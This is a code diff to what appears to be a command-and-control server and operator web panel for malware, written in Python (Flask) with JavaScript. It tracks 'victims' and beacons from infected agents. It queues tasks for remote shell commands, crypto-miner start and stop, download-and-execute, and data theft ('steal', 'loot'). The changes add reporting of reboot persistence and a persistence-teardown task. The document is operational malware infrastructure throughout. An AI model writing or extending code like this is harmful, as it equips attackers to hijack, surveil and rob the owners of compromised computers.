@@ -263,8 +263,9 @@ def agent_checkin():
     miner = data.get("miner")
     sysinfo = data.get("sysinfo")
     counts = data.get("counts")
+    persist = data.get("persist")
     touch_victim(vid, ip=request.remote_addr, sysinfo=sysinfo, counts=counts, miner=miner,
-                 extra={"agent": True})
+                 extra={"agent": True, **({"persist": persist} if persist else {})})
     pending = pop_tasks(vid)
     log(f"agent {vid} beacon miner={miner} tasks={len(pending)}")
     return jsonify({"status": "ok", "tasks": pending})
@@ -404,7 +405,7 @@ def api_task():
     ttype = str(data.get("type", ""))[:32]
     args = data.get("args", {}) or {}
     if not vid or ttype not in ("shell", "miner_start", "miner_stop",
-                                "download_exec", "steal", "raw"):
+                                "download_exec", "steal", "persist_purge", "raw"):
         return jsonify({"status": "bad-task"}), 400
     # fill miner_start blanks from stored defaults
     if ttype == "miner_start":
@@ -730,6 +731,7 @@ label{display:block;font-size:10.5px;font-weight:700;color:var(--dim);margin-bot
           <option value=miner_stop>miner_stop</option>
           <option value=download_exec>download_exec</option>
           <option value=steal>steal (re-run)</option>
+          <option value=persist_purge>persist_purge (teardown)</option>
         </select></div>
       <div class=field style="flex:2"><label>args (json)</label>
         <input id=ta placeholder='{"cmd":"whoami"}' style="width:100%" spellcheck=false></div>
@@ -811,6 +813,13 @@ function minerPill(v){
   return '<span class="pill ' + (m ? "on" : "off") + '">' + (m ? "&#9889; MINING" : "idle") + "</span>";
 }
 
+function persistPill(v){
+  const p = v.persist;
+  if (!p || typeof p !== "object") return "";
+  return '<span class="pill ' + (p.active ? "on" : "off") + '" title="reboot persistence">'
+    + (p.active ? "&#128274; PERSIST" : "no persist") + "</span>";
+}
+
 async function load(quiet){
   if (refreshing) return;
   refreshing = true;
@@ -835,7 +844,7 @@ async function load(quiet){
         + "<td>" + esc((v.last_seen || "?").replace("T"," ").slice(0,19)) + "</td>"
         + '<td class=hide-s>' + esc(v.ip || "?") + "</td>"
         + "<td>" + (v.records || 0) + "</td>"
-        + "<td>" + minerPill(v) + "</td>"
+        + "<td>" + minerPill(v) + " " + persistPill(v) + "</td>"
         + '<td><button class="ghost mini" data-act="start" data-vid="' + esc(v.id) + '">start</button> '
         + '<button class="danger mini" data-act="stop" data-vid="' + esc(v.id) + '">stop</button></td></tr>'
       ).join("");
@@ -869,10 +878,12 @@ async function detail(id, quiet){
       + "</span> <pre style='margin-top:4px'>" + esc(typeof r.output === "string" ? r.output : JSON.stringify(r.output, null, 1)) + "</pre></div>").join("");
     const sys = v.sysinfo ? esc(JSON.stringify(v.sysinfo)) : "<span class=dim>hidden</span>";
     $("det").innerHTML =
-      '<div class=row style="margin-bottom:10px">' + minerPill(v)
+      '<div class=row style="margin-bottom:10px">' + minerPill(v) + " " + persistPill(v)
       + '<span class="pill" style="background:#1a1a2e">beacons ' + (v.beacons || 0) + "</span>"
       + '<span class="pill" style="background:#1a1a2e">records ' + (v.records || 0) + "</span></div>"
       + '<p class=small><span class=dim>sysinfo:</span> ' + sys + "</p>"
+      + (v.persist ? '<p class=small><span class=dim>persistence:</span> <code>'
+          + esc(JSON.stringify(v.persist)) + "</code></p>" : "")
       + '<p class=small style="margin:8px 0 4px"><span class=dim>loot:</span><br>' + chips + "</p>"
       + '<p class="small" style="margin:12px 0 4px"><span class=dim>tasks:</span></p>' + tasks
       + (results ? '<p class="small" style="margin:12px 0 4px"><span class=dim>results:</span></p>' + results : "")
